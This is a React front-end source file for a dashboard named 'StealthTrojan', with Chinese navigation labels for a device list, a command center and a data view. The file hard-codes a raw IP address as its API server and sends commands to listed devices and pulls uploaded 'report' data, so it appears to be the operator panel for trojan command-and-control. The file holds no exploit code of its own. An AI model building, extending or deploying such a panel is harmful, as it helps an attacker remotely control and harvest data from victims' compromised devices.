import React, { useState, useEffect } from 'react';
import './App.css';
import DeviceList from './components/DeviceList';
import DeviceDetail from './components/DeviceDetail';
import CommandCenter from './components/CommandCenter';
import DataView from './components/DataView';

const API_URL = 'http://43.161.233.72:80';

function App() {
  const [activeTab, setActiveTab] = useState('devices');
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);

  const fetchDevices = async () => {
    try {
      const response = await fetch(`${API_URL}/api/v1/device/list`);
      const data = await response.json();
      setDevices(data.devices || []);
    } catch (err) {
      console.error('Failed to fetch devices:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchDevices();
  }, []);

  const handleDeviceSelect = (device) => {
    setSelectedDevice(device);
    setActiveTab('device');
  };

  const handleCommandSend = async (deviceId, command, params) => {
    try {
      await fetch(`${API_URL}/api/v1/device/${deviceId}/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ device_id: deviceId, command, params })
      });
    } catch (err) {
      console.error('Command send failed:', err);
    }
  };

  const handleDataUpload = async (deviceId, data) => {
    try {
      await fetch(`${API_URL}/api/v1/device/${deviceId}/upload`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ device_id: deviceId, message_type: 'report', payload: data })
      });
    } catch (err) {
      console.error('Data upload failed:', err);
    }
  };

  return (
    <div className="app">
      <header className="header">
        <h1>🌲 StealthTrojan</h1>
        <nav className="nav">
          <button
            className={`nav-btn ${activeTab === 'devices' ? 'active' : ''}`}
            onClick={() => { setActiveTab('devices'); setSelectedDevice(null); }}
          >
            设备列表
          </button>
          <button
            className={`nav-btn ${activeTab === 'command' ? 'active' : ''}`}
            onClick={() => setActiveTab('command')}
          >
            指令中心
          </button>
          <button
            className={`nav-btn ${activeTab === 'data' ? 'active' : ''}`}
            onClick={() => setActiveTab('data')}
          >
            数据查看
          </button>
        </nav>
      </header>

      <main className="main">
        {activeTab === 'devices' && <DeviceList devices={devices} onSelect={handleDeviceSelect} loading={loading} />}
        {activeTab === 'device' && selectedDevice && (
          <DeviceDetail device={selectedDevice} />
        )}
        {activeTab === 'command' && (
          <CommandCenter onCommand={handleCommandSend} devices={devices} />
        )}
        {activeTab === 'data' && (
          <DataView devices={devices} onDataUpload={handleDataUpload} />
        )}
      </main>
    </div>
  );
}

export default App;
